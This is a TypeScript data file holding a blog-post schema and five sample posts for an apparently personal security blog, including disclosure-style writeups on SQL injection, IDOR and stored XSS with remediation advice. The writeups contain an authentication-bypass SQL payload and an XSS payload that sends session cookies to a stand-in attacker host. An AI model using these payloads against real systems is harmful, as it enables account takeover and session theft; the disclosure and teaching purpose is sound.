export interface BlogPost {
  // Core Fields
  id: number | string
  slug: string
  title: string
  excerpt: string
  content: string
  category: string
  type: 'writeup' | 'news' | 'story'
  tags?: string[]

  // Display & UX
  heroImage?: string
  readTime: string
  date: string

  // Publishing Workflow
  status?: 'draft' | 'scheduled' | 'published' | 'archived'
  publishedAt?: string
  createdAt?: string
  updatedAt?: string

  // Author & Attribution
  author?: string
  authorAvatar?: string
  authorRole?: string

  // SEO Metadata
  seoTitle?: string
  seoDescription?: string
  canonicalUrl?: string
  ogImage?: string

  // Security Research (for writeups)
  cve?: string
  cwe?: string
  cvss?: number
  affectedProduct?: string
  vendor?: string
  difficulty?: 'Low' | 'Medium' | 'High' | 'Critical'
  bountyAmount?: number

  // External Resources
  pocVideoUrl?: string
  reportUrl?: string
}

export const blogPosts: BlogPost[] = [
  {
    id: 1,
    slug: 'sql-injection-in-payment-gateway',
    title: 'SQL Injection Vulnerability in Payment Gateway',
    excerpt: 'Discovered and disclosed a critical SQL injection vulnerability that could have compromised thousands of user records.',
    date: '2024-12-15',
    category: 'Web Security',
    readTime: '8 min read',
    type: 'writeup',
    difficulty: 'Critical',
    bountyAmount: 5000,
    tags: ['SQLi', 'Authentication', 'Database', 'Critical'],
    content: `# SQL Injection Vulnerability in Payment Gateway

## Overview
During a security assessment of a popular payment gateway, I discovered a critical SQL injection vulnerability in the login endpoint that could allow attackers to bypass authentication and access sensitive user data.

## Vulnerability Details
The vulnerability existed in the user authentication mechanism where user input was directly concatenated into SQL queries without proper sanitization.

\`\`\`sql
SELECT * FROM users WHERE email = '$email' AND password = '$password'
\`\`\`

### Attack Vector
An attacker could craft a malicious email parameter like:
\`\`\`
admin'--
\`\`\`

This would bypass the password check entirely and grant unauthorized access.

## Impact
- Unauthorized access to user accounts
- Potential data breach affecting thousands of users
- Financial fraud opportunities
- Compliance violations (PCI DSS)

## Remediation
The vendor implemented parameterized queries:
\`\`\`sql
SELECT * FROM users WHERE email = ? AND password = ?
\`\`\`

## Timeline
- **Dec 1**: Vulnerability discovered and reported
- **Dec 5**: Vendor acknowledged the issue
- **Dec 12**: Patch released
- **Dec 15**: Public disclosure (after 30-day responsible disclosure window)

## Lessons Learned
Always use parameterized queries or prepared statements to prevent SQL injection. Input validation alone is insufficient.`
  },
  {
    id: 2,
    slug: 'broken-access-control-in-admin-panel',
    title: 'Broken Access Control in Admin Panel',
    excerpt: 'Found an IDOR vulnerability allowing regular users to access and modify administrative functions.',
    date: '2024-11-28',
    category: 'Access Control',
    readTime: '6 min read',
    type: 'writeup',
    difficulty: 'High',
    bountyAmount: 3500,
    tags: ['IDOR', 'Authorization', 'Access Control', 'High'],
    content: `# Broken Access Control in Admin Panel

## Summary
Discovered an Insecure Direct Object Reference (IDOR) vulnerability in an admin panel that allowed regular users to access and modify administrative functions without proper authorization checks.

## Technical Details
The admin API endpoints were protected only by URL obfuscation. The application used predictable user IDs in URLs:

\`\`\`
/api/admin/users/12345/edit
/api/admin/settings/update
\`\`\`

Any authenticated user could modify these IDs and access administrative functions.

## Proof of Concept
1. Login as regular user
2. Navigate to any page and intercept the request
3. Modify the endpoint from \`/user/profile\` to \`/admin/settings\`
4. Access granted without authorization validation

## Impact
- Unauthorized administrative access
- Data manipulation capabilities
- User account deletion potential
- System configuration changes

## Resolution
The vendor implemented proper role-based access control (RBAC) with server-side authorization checks on all endpoints.

## Prevention
Always implement:
- Role-based access control (RBAC)
- Server-side authorization validation
- Principle of least privilege
- Audit logging for sensitive operations`
  },
  {
    id: 3,
    slug: 'xss-vulnerability-in-comment-system',
    title: 'XSS Vulnerability in Comment System',
    excerpt: 'Identified stored XSS vulnerability in user comments that could lead to account takeover.',
    date: '2024-10-12',
    category: 'Web Security',
    readTime: '7 min read',
    type: 'writeup',
    difficulty: 'High',
    bountyAmount: 2500,
    tags: ['XSS', 'Stored XSS', 'Input Validation', 'High'],
    content: `# Stored XSS Vulnerability in Comment System

## Introduction
During security testing of a social platform, I discovered a stored XSS vulnerability in the comment system that could allow attackers to inject malicious scripts.

## Vulnerability Analysis
The application failed to properly sanitize user input in comments. Attackers could inject JavaScript that would execute in the browsers of all users viewing the comment.

### Payload
\`\`\`html
<img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">
\`\`\`

## Attack Scenario
1. Attacker posts comment with XSS payload
2. Comment is stored in database without sanitization
3. Any user viewing the comment executes the malicious script
4. Attacker steals session cookies and session tokens
5. Attacker impersonates victim users

## Business Impact
- Account takeover risk for all users
- Reputational damage
- Potential legal liability
- User data exposure

## Fix Implementation
- HTML entity encoding for all user input
- Content Security Policy (CSP) headers
- Input validation and output escaping
- Regular security testing

## Testing
\`\`\`javascript
// Before fix
comment.innerHTML = userInput; // DANGEROUS

// After fix
const div = document.createElement('div');
div.textContent = userInput;
comment.appendChild(div);
\`\`\``
  },
  {
    id: 4,
    slug: 'htb-pwned-global-rankings',
    title: 'Achieved Top 100 in HackTheBox Global Rankings',
    excerpt: 'Excited to announce reaching the top 100 hackers globally on HackTheBox! A journey of continuous learning and persistence.',
    date: '2024-12-10',
    category: 'News',
    readTime: '3 min read',
    type: 'news',
    tags: ['Achievement', 'HackTheBox', 'Milestone'],
    content: `# Achieved Top 100 in HackTheBox Global Rankings

## The Achievement
Today marks a significant milestone in my security research journey. After months of grinding through HackTheBox machines and challenges, I've officially reached the top 100 hackers globally on the platform!

## What This Means
- Mastery across multiple attack vectors
- Deep understanding of real-world vulnerabilities
- Thousands of hours invested in skill development
- Recognition within the security community

## The Journey
Starting from scratch, I've progressively tackled harder machines, learning from each one. The platform has been invaluable for:
- Building practical exploitation skills
- Understanding defense mechanisms
- Improving time management in CTF scenarios
- Networking with other security professionals

## What's Next
This achievement motivates me to:
- Continue hunting for real vulnerabilities
- Share knowledge through detailed writeups
- Mentor newer hackers in the community
- Push towards even higher rankings

Thanks to the HackTheBox community for creating such an amazing platform!`
  },
  {
    id: 5,
    slug: 'my-journey-into-cybersecurity',
    title: 'From Curious Developer to Security Researcher',
    excerpt: 'The untold story of how I transitioned from web development to finding critical vulnerabilities in production systems.',
    date: '2024-12-05',
    category: 'Story',
    readTime: '12 min read',
    type: 'story',
    tags: ['Career', 'Security', 'Learning'],
    content: `# From Curious Developer to Security Researcher

## The Beginning
Five years ago, I was just another web developer building features. I didn't think about security beyond following OWASP guidelines. Then one day, a simple oversight in a project I was working on exposed customer data. That moment changed everything.

## The Awakening
After that incident, I became obsessed with understanding vulnerabilities. I started:
- Reading security blogs obsessively
- Taking courses on penetration testing
- Setting up my own lab environment
- Playing Capture The Flag competitions

## First Bug Bounty
My first bug bounty report was a simple XSS vulnerability in a startup's dashboard. They fixed it immediately and sent me \$200. That \$200 felt like a million dollars because I had discovered something no one else had found.

## Building the Skills
Over the next few years, I:
- Learned multiple programming languages
- Studied cryptography and networking
- Participated in CTF competitions
- Read countless vulnerability advisories
- Built tools to automate exploitation

## The Real Wins
The real victories weren't always about the bounty amount. They were about:
- Helping companies secure their systems
- Responsible disclosure and good relationships
- Being recognized as a trusted researcher
- Contributing to a safer internet

## Today
Now, I dedicate my time to finding vulnerabilities through responsible disclosure, contributing to the security community, and helping organizations build more secure products.

The journey from curiosity to expertise is never over, and that's what makes this field so exciting.`
  }
]
